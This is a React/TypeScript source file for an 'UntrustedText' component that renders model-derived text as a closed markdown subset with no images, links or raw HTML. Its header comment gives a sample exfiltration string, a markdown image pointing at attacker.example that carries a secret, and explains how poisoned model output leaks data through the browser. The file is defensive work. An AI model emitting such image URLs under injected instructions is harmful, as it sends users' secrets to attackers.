import React from 'react';

/**
 * INV-9 — untrusted and model-derived text is rendered escaped. Never as HTML,
 * never auto-linkified, and never as the source of a loaded resource.
 *
 * Why this component exists:
 *
 * Model output is DERIVED from untrusted content and can be poisoned. A
 * markdown renderer turns `![](https://attacker.example/x.png?d=SECRET)` into
 * an <img>, and the browser fetches it the moment it paints. That is a working
 * exfiltration channel needing no tool call, no capability grant, and no
 * cooperation from the model beyond emitting a string.
 *
 * The airlock stops untrusted text from causing an ACTION. It does nothing
 * about the browser being tricked into making a request. This is the other
 * half of the boundary, and it lives in the renderer.
 *
 * ---
 *
 * The first version of this file rendered everything as one flat pre-wrap
 * block. That was safe but unreadable: the assistant emits markdown, so users
 * saw literal `### Heading` and `**bold**` on screen.
 *
 * The fix is NOT to reach back for a markdown library. It is to format a tiny,
 * closed subset ourselves, as React elements:
 *
 *   headings, bold, italic, inline code, bullet and numbered lists.
 *
 * What the subset deliberately EXCLUDES is the whole point:
 *
 *   - no images      -> nothing can trigger a network request
 *   - no links       -> nothing is clickable, no one-click phish
 *   - no raw HTML    -> React escapes every string it renders
 *
 * Because the output is React elements built from parsed text, and never an
 * HTML string, there is no injection surface here at all. An attacker who
 * fully controls the text can, at most, make it bold.
 */

interface UntrustedTextProps {
  text: string;
  className?: string;
  placeholder?: string;
}

/** Inline spans: **bold**, *italic*, `code`. Everything else stays literal. */
function renderInline(raw: string, keyPrefix: string): React.ReactNode[] {
  const out: React.ReactNode[] = [];
  // One pass, three alternatives. Order matters: ** before *.
  const pattern = /(\*\*[^*]+\*\*|\*[^*\n]+\*|`[^`\n]+`)/g;
  let last = 0;
  let m: RegExpExecArray | null;
  let i = 0;

  while ((m = pattern.exec(raw)) !== null) {
    if (m.index > last) out.push(raw.slice(last, m.index));
    const token = m[0];

    if (token.startsWith('**')) {
      out.push(
        <strong key={`${keyPrefix}-b${i}`} className="font-semibold text-[#1a1a1a]">
          {token.slice(2, -2)}
        </strong>,
      );
    } else if (token.startsWith('`')) {
      out.push(
        <code
          key={`${keyPrefix}-c${i}`}
          className="rounded border border-[#e5e5e5] bg-[#f7f7f8] px-1 py-0.5 font-mono text-[0.85em] text-[#1a1a1a]"
        >
          {token.slice(1, -1)}
        </code>,
      );
    } else {
      out.push(
        <em key={`${keyPrefix}-i${i}`} className="italic">
          {token.slice(1, -1)}
        </em>,
      );
    }

    last = m.index + token.length;
    i++;
  }

  if (last < raw.length) out.push(raw.slice(last));
  return out;
}

type Block =
  | { kind: 'h'; level: 2 | 3; text: string }
  | { kind: 'p'; text: string }
  | { kind: 'ul'; items: string[] }
  | { kind: 'ol'; items: string[] }
  | { kind: 'code'; text: string; lang: string | null };

/**
 * A fence's info string is attacker-controlled, so only a bare identifier is
 * ever displayed. Everything else is dropped rather than shown escaped —
 * there is no reason to paint an attacker's sentence as a language label.
 */
const SAFE_LANG = /^[A-Za-z0-9+#._-]{1,20}$/;

/** Groups lines into blocks. Deliberately tiny: no tables, quotes, or images. */
function parseBlocks(text: string): Block[] {
  const lines = text.split('\n');
  const blocks: Block[] = [];
  let para: string[] = [];
  let list: { ordered: boolean; items: string[] } | null = null;

  const flushPara = () => {
    if (para.length) {
      blocks.push({ kind: 'p', text: para.join(' ') });
      para = [];
    }
  };
  const flushList = () => {
    if (list) {
      blocks.push(list.ordered ? { kind: 'ol', items: list.items } : { kind: 'ul', items: list.items });
      list = null;
    }
  };

  // Fence state. Lines inside a fence are taken RAW so indentation survives,
  // and no inline formatting is applied to them at render time.
  let fence: { char: string; len: number; lang: string | null; body: string[] } | null = null;

  const flushFence = () => {
    if (fence) {
      blocks.push({ kind: 'code', text: fence.body.join('\n'), lang: fence.lang });
      fence = null;
    }
  };

  for (const line of lines) {
    const t = line.trim();

    if (fence) {
      // A closer is the same character, at least as long as the opener, and
      // alone on its line. A shorter or different run inside the block must
      // not end it early, or the rest of a payload escapes the code context
      // and gets formatted.
      const closer = /^(`{3,}|~{3,})$/.exec(t);
      if (closer && closer[1][0] === fence.char && closer[1].length >= fence.len) {
        flushFence();
      } else {
        fence.body.push(line);
      }
      continue;
    }

    const opener = /^(`{3,}|~{3,})\s*(.*)$/.exec(t);
    if (opener) {
      flushPara();
      flushList();
      const info = opener[2].trim();
      fence = {
        char: opener[1][0],
        len: opener[1].length,
        lang: SAFE_LANG.test(info) ? info : null,
        body: [],
      };
      continue;
    }

    if (!t) {
      flushPara();
      flushList();
      continue;
    }

    const heading = /^(#{1,6})\s+(.*)$/.exec(t);
    if (heading) {
      flushPara();
      flushList();
      blocks.push({ kind: 'h', level: heading[1].length <= 2 ? 2 : 3, text: heading[2] });
      continue;
    }

    const bullet = /^[-*+]\s+(.*)$/.exec(t);
    if (bullet) {
      flushPara();
      if (!list || list.ordered) {
        flushList();
        list = { ordered: false, items: [] };
      }
      list.items.push(bullet[1]);
      continue;
    }

    const numbered = /^\d+[.)]\s+(.*)$/.exec(t);
    if (numbered) {
      flushPara();
      if (!list || !list.ordered) {
        flushList();
        list = { ordered: true, items: [] };
      }
      list.items.push(numbered[1]);
      continue;
    }

    flushList();
    para.push(t);
  }

  flushPara();
  flushList();
  // An unterminated fence stays code to the end of the text. That is the safe
  // direction: falling back to paragraphs would apply inline formatting to
  // text an attacker chose, and an unclosed fence is a known concealment
  // trick (see server/containment.ts, which discards them for the mirror
  // reason — there the question is whether a payload is QUOTED, here it is
  // whether it gets FORMATTED).
  flushFence();
  return blocks;
}

export const UntrustedText: React.FC<UntrustedTextProps> = ({
  text,
  className = '',
  placeholder = 'No content.',
}) => {
  const value = typeof text === 'string' ? text : '';

  if (!value.trim()) {
    return <p className={`text-sm italic text-[#6b6b6b] ${className}`}>{placeholder}</p>;
  }

  const blocks = parseBlocks(value);

  return (
    <div className={`space-y-2.5 text-sm leading-relaxed text-[#1a1a1a] ${className}`}>
      {blocks.map((b, i) => {
        if (b.kind === 'h') {
          return b.level === 2 ? (
            <h3 key={i} className="mt-1 font-serif text-base font-semibold text-[#1a1a1a]">
              {renderInline(b.text, `h${i}`)}
            </h3>
          ) : (
            <h4 key={i} className="mt-1 text-sm font-semibold text-[#3f3f3f]">
              {renderInline(b.text, `h${i}`)}
            </h4>
          );
        }

        if (b.kind === 'code') {
          // <pre><code> of an escaped string: no resource is loaded, nothing
          // is clickable, nothing runs. React escapes the text, and the text
          // is passed as a child rather than through renderInline, so the
          // code shown is the code the model emitted.
          return (
            <div
              key={i}
              className="overflow-hidden rounded-lg border border-[#e5e5e5] bg-[#fbf9f2]"
            >
              {b.lang && (
                <div className="border-b border-[#e5e5e5] px-3 py-1 font-mono text-[10px] text-[#6b6b6b]">
                  {b.lang}
                </div>
              )}
              <pre className="overflow-x-auto px-3 py-2.5">
                <code className="font-mono text-xs leading-relaxed text-[#1a1a1a]">{b.text}</code>
              </pre>
            </div>
          );
        }

        if (b.kind === 'ul') {
          return (
            <ul key={i} className="ml-1 space-y-1.5">
              {b.items.map((item, j) => (
                <li key={j} className="flex gap-2">
                  <span aria-hidden="true" className="mt-[0.55em] h-1 w-1 shrink-0 rounded-full bg-[#6b6b6b]" />
                  <span className="min-w-0 break-words">{renderInline(item, `u${i}-${j}`)}</span>
                </li>
              ))}
            </ul>
          );
        }

        if (b.kind === 'ol') {
          return (
            <ol key={i} className="ml-1 space-y-1.5">
              {b.items.map((item, j) => (
                <li key={j} className="flex gap-2.5">
                  <span className="mt-px shrink-0 font-mono text-xs text-[#6b6b6b]">{j + 1}.</span>
                  <span className="min-w-0 break-words">{renderInline(item, `o${i}-${j}`)}</span>
                </li>
              ))}
            </ol>
          );
        }

        return (
          <p key={i} className="break-words">
            {renderInline(b.text, `p${i}`)}
          </p>
        );
      })}
    </div>
  );
};

/**
 * For text the signed-in user typed themselves. Same renderer, different name
 * at the call site so a reader can see which zone is in play.
 *
 * First-party content is not rendered as HTML either: a user who pastes a
 * poisoned string into their own entry should not be able to attack their own
 * browser with it, and the distinction is not worth a second code path.
 */
export const UserText: React.FC<UntrustedTextProps> = (props) => <UntrustedText {...props} />;
